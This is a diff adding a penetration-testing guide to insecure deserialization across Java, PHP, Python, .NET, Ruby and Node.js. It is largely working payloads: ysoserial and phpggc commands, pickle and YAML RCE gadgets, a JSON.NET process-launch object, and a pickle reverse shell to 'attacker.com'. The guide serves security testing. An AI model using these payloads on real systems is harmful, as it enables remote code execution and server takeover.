@@ -1,0 +1,381 @@
+<deserialization_vulnerability_guide>
+<title>INSECURE DESERIALIZATION</title>
+
+<critical>Insecure deserialization occurs when untrusted data is used to instantiate objects without proper validation. Attackers can manipulate serialized data to execute arbitrary code, bypass authentication, or perform denial of service attacks. This vulnerability class consistently leads to remote code execution.</critical>
+
+<scope>
+- Java: ObjectInputStream, XMLDecoder, XStream, Jackson, SnakeYAML
+- PHP: unserialize(), phar://, __wakeup(), __destruct()
+- Python: pickle, PyYAML, marshal, shelve
+- .NET: BinaryFormatter, DataContractSerializer, JSON.NET, XmlSerializer
+- Ruby: Marshal.load, YAML.load
+- Node.js: node-serialize, serialize-javascript
+</scope>
+
+<methodology>
+1. Identify deserialization sinks: endpoints accepting serialized data, file uploads, cookies, hidden fields.
+2. Determine serialization format through magic bytes, content types, or error messages.
+3. Map available classes/gadgets in the application's classpath or dependencies.
+4. Construct gadget chains that lead from deserialization to code execution.
+5. Deliver payload via identified input vector and confirm exploitation.
+</methodology>
+
+<detection_methods>
+<magic_bytes>
+{% raw %}
+# Java serialized objects
+AC ED 00 05 (0xaced0005) - Java ObjectInputStream
+rO0 - Base64 encoded Java serialized object
+
+# Python pickle
+80 04 95 - Protocol 4
+80 03 - Protocol 3
+(dp0 - Protocol 0 (text-based)
+
+# PHP serialized objects
+O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:6:"secret";}
+a: - Array, O: - Object, s: - String, i: - Integer
+
+# .NET BinaryFormatter
+00 01 00 00 00 FF FF FF FF - BinaryFormatter magic
+
+# Ruby Marshal
+04 08 - Marshal.dump magic bytes
+{% endraw %}
+</magic_bytes>
+
+<content_types>
+- application/x-java-serialized-object
+- application/x-java-object
+- application/octet-stream (often used for binary serialization)
+- application/x-httpd-php-serialized
+- Content-Type headers may not be reliable; check body patterns
+</content_types>
+
+<indicators>
+- Base64-encoded data in cookies, parameters, or hidden fields
+- Binary data in request/response bodies
+- Java exceptions: java.io.InvalidClassException, ClassNotFoundException
+- PHP errors: unserialize() warning, __wakeup failed
+- .NET errors: SerializationException, TypeLoadException
+</indicators>
+</detection_methods>
+
+<java_techniques>
+<common_gadgets>
+{% raw %}
+# Apache Commons Collections (CC1-CC7)
+- InvokerTransformer
+- InstantiateTransformer
+- ChainedTransformer
+- ConstantTransformer
+
+# Spring Framework
+- MethodInvokeTypeProvider
+- ObjectFactoryDelegatingInvocationHandler
+
+# Common Beans Utils
+- BeanComparator
+- PropertyUtils
+
+# ROME (RSS library)
+- ObjectBean
+- ToStringBean
+
+# JDK classes
+- BadAttributeValueExpException
+- HashSet + HashMap
+{% endraw %}
+</common_gadgets>
+
+<exploitation_tools>
+{% raw %}
+# ysoserial - generate Java deserialization payloads
+java -jar ysoserial.jar CommonsCollections6 'id' | base64
+
+# Common payload generators
+CommonsCollections1-7  # Apache Commons Collections
+CommonsCollections4    # With Java 8+
+Spring1/Spring2        # Spring Framework
+JRMPClient/JRMPListener # JRMP protocol gadgets
+Groovy1                # Groovy runtime
+Hibernate1/Hibernate2  # Hibernate ORM
+{% endraw %}
+</exploitation_tools>
+
+<bypasses>
+{% raw %}
+# JEP 290 bypass (Java 9+)
+- Use gadgets from application dependencies not in blacklist
+- JRMP-based attacks to external classloader
+- Second-order deserialization via JNDI
+
+# Custom ObjectInputStream bypass
+- Find alternative deserialization paths (XMLDecoder, XStream)
+- Use nested serialization in allowed classes
+{% endraw %}
+</bypasses>
+</java_techniques>
+
+<php_techniques>
+<object_injection>
+{% raw %}
+# Basic PHP object structure
+O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:6:"secret";}
+
+# Exploit __wakeup, __destruct, __toString magic methods
+# Target class with dangerous __destruct():
+class FileDelete {
+    public $filename;
+    function __destruct() { unlink($this->filename); }
+}
+
+# Serialized payload:
+O:10:"FileDelete":1:{s:8:"filename";s:11:"/etc/passwd";}
+
+# Common gadget chains (PHPGGc)
+Guzzle/FW1          # File write
+Guzzle/RCE1         # Remote code execution
+Laravel/RCE1-RCE8   # Laravel framework gadgets
+Monolog/RCE1-RCE6   # Monolog logging library
+Symfony/RCE1-RCE4   # Symfony framework
+{% endraw %}
+</object_injection>
+
+<phar_deserialization>
+{% raw %}
+# Phar files trigger unserialization in metadata
+# Create malicious phar:
+$phar = new Phar('exploit.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'test');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->setMetadata($malicious_object);
+$phar->stopBuffering();
+
+# Trigger via file operations:
+file_exists('phar://uploads/exploit.phar')
+file_get_contents('phar://...')
+include('phar://...')
+fopen('phar://...')
+is_dir('phar://...')
+
+# Vulnerable functions accepting phar:// wrapper
+file_exists, is_dir, is_file, is_writable, is_readable
+file_get_contents, file, fopen, include, require
+copy, unlink, stat, filemtime, filesize
+getimagesize, exif_read_data
+{% endraw %}
+</phar_deserialization>
+
+<phpggc>
+{% raw %}
+# Generate PHP gadget chains
+phpggc Laravel/RCE1 system 'id'
+phpggc Monolog/RCE1 'system' 'id'
+phpggc Symfony/RCE4 'id'
+
+# Generate with phar wrapper
+phpggc -p phar -o exploit.phar Laravel/RCE1 system 'id'
+{% endraw %}
+</phpggc>
+</php_techniques>
+
+<python_techniques>
+<pickle_exploitation>
+{% raw %}
+# Basic pickle RCE payload
+import pickle
+import base64
+
+class RCE:
+    def __reduce__(self):
+        import os
+        return (os.system, ('id',))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+
+# More reliable payload with subprocess
+class Exploit:
+    def __reduce__(self):
+        import subprocess
+        return (subprocess.check_output, (['id'],))
+
+# Reverse shell
+class RevShell:
+    def __reduce__(self):
+        import socket, subprocess, os
+        return (os.system, ('python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'\\x2fbin\\x2fsh\',\'-i\'])"',))
+{% endraw %}
+</pickle_exploitation>
+
+<yaml_exploitation>
+{% raw %}
+# PyYAML RCE (Python 2, PyYAML < 5.1)
+!!python/object/apply:os.system ['id']
+!!python/object/apply:subprocess.check_output [['id']]
+
+# PyYAML 5.1+ requires explicit unsafe_load or Loader=Loader
+# Check for yaml.unsafe_load or yaml.load(..., Loader=Loader)
+
+# Alternative payloads
+!!python/object/new:subprocess.Popen
+  args: ['id']
+  shell: true
+
+# Using __reduce__
+!!python/object/apply:builtins.eval
+  args: ["__import__('os').system('id')"]
+{% endraw %}
+</yaml_exploitation>
+</python_techniques>
+
+<dotnet_techniques>
+<binaryformatter>
+{% raw %}
+# BinaryFormatter is inherently unsafe
+# Use ysoserial.net to generate payloads
+
+# ysoserial.net gadget chains
+ActivitySurrogateSelector
+TypeConfuseDelegate
+TextFormattingRunProperties
+WindowsIdentity
+DataSet
+ObjectDataProvider
+
+# Common command
+ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c id"
+{% endraw %}
+</binaryformatter>
+
+<json_net>
+{% raw %}
+# JSON.NET TypeNameHandling vulnerability
+# When TypeNameHandling != None
+
+{
+    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+    "MethodName": "Start",
+    "MethodParameters": {
+        "$type": "System.Collections.ArrayList, mscorlib",
+        "$values": ["cmd", "/c id"]
+    },
+    "ObjectInstance": {
+        "$type": "System.Diagnostics.Process, System"
+    }
+}
+
+# Alternative gadgets
+System.Configuration.Install.AssemblyInstaller
+System.Activities.Presentation.WorkflowDesigner
+{% endraw %}
+</json_net>
+
+<viewstate>
+{% raw %}
+# ASP.NET ViewState deserialization
+# If MAC validation disabled or key known
+
+# Use ysoserial.net with ViewState plugin
+ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c id"
+
+# Requires knowledge of:
+- machineKey (validation/decryption keys)
+- ViewState path
+- .NET Framework version
+{% endraw %}
+</viewstate>
+</dotnet_techniques>
+
+<ruby_techniques>
+{% raw %}
+# Marshal.load vulnerability
+# Universal gadget chain via ERB template
+require 'erb'
+
+class Exploit
+  def initialize(cmd)
+    @src = "%x(#{cmd})"
+    @filename = 'x'
+    @lineno = 1
+  end
+end
+
+payload = Marshal.dump(Exploit.new('id'))
+
+# YAML.load (Ruby < 2.x)
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher
+i: y
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::Package::TarReader
+  io: &1 !ruby/object:Net::BufferedIO
+    io: &1 !ruby/object:Gem::Package::TarReader::Entry
+       read: 0
+       header: "abc"
+    debug_output: &1 !ruby/object:Net::WriteAdapter
+       socket: &1 !ruby/object:Gem::RequestSet
+           sets: !ruby/object:Net::WriteAdapter
+               socket: !ruby/module 'Kernel'
+               method_id: :system
+           git_set: id
+       method_id: :resolve
+{% endraw %}
+</ruby_techniques>
+
+<nodejs_techniques>
+{% raw %}
+# node-serialize vulnerability
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+
+# serialize-javascript
+# Look for eval() or Function() usage with deserialized data
+
+# General approach: JavaScript prototype pollution
+# Then trigger code execution via gadgets
+{% endraw %}
+</nodejs_techniques>
+
+<validation>
+1. Identify the serialization format through magic bytes or error messages.
+2. Demonstrate controlled object instantiation or property modification.
+3. Achieve RCE with verifiable output (command output, file creation, callback).
+4. Show the complete gadget chain and payload construction.
+5. Document library versions and dependencies required for exploitation.
+</validation>
+
+<false_positives>
+- Serialization with cryptographic integrity verification (signed/encrypted)
+- Whitelist-based class filtering during deserialization
+- Isolated deserialization with no dangerous gadget classes available
+- Type-safe serialization formats (Protocol Buffers, FlatBuffers, Cap'n Proto)
+- Application-level validation of deserialized data before use
+</false_positives>
+
+<impact>
+- Remote code execution with server privileges
+- Authentication bypass via session manipulation
+- Data tampering and integrity violations
+- Denial of service through resource exhaustion
+- Server-side request forgery (SSRF) via code execution
+- Complete server compromise and lateral movement
+</impact>
+
+<pro_tips>
+1. Always check application dependencies for known gadget chains.
+2. Use ysoserial, ysoserial.net, and phpggc for payload generation.
+3. Test multiple serialization formats; applications may use several.
+4. Look for deserialization in cookies, hidden fields, file uploads, and APIs.
+5. Check for ViewState, Faces contexts, and framework-specific serialization.
+6. Monitor for out-of-band callbacks when direct output is unavailable.
+7. Consider second-order deserialization via JNDI, XXE, or SSRF.
+8. Test phar:// wrappers in PHP file operation functions.
+9. Verify gadget chain compatibility with target library versions.
+10. Document the full attack chain for reproducibility.
+</pro_tips>
+
+<remember>Deserialization is the process of reconstructing objects from data. When that data is untrusted, the attacker controls object creation. Never deserialize untrusted data, and if unavoidable, use type-safe formats with strict schema validation.</remember>
+</deserialization_vulnerability_guide>
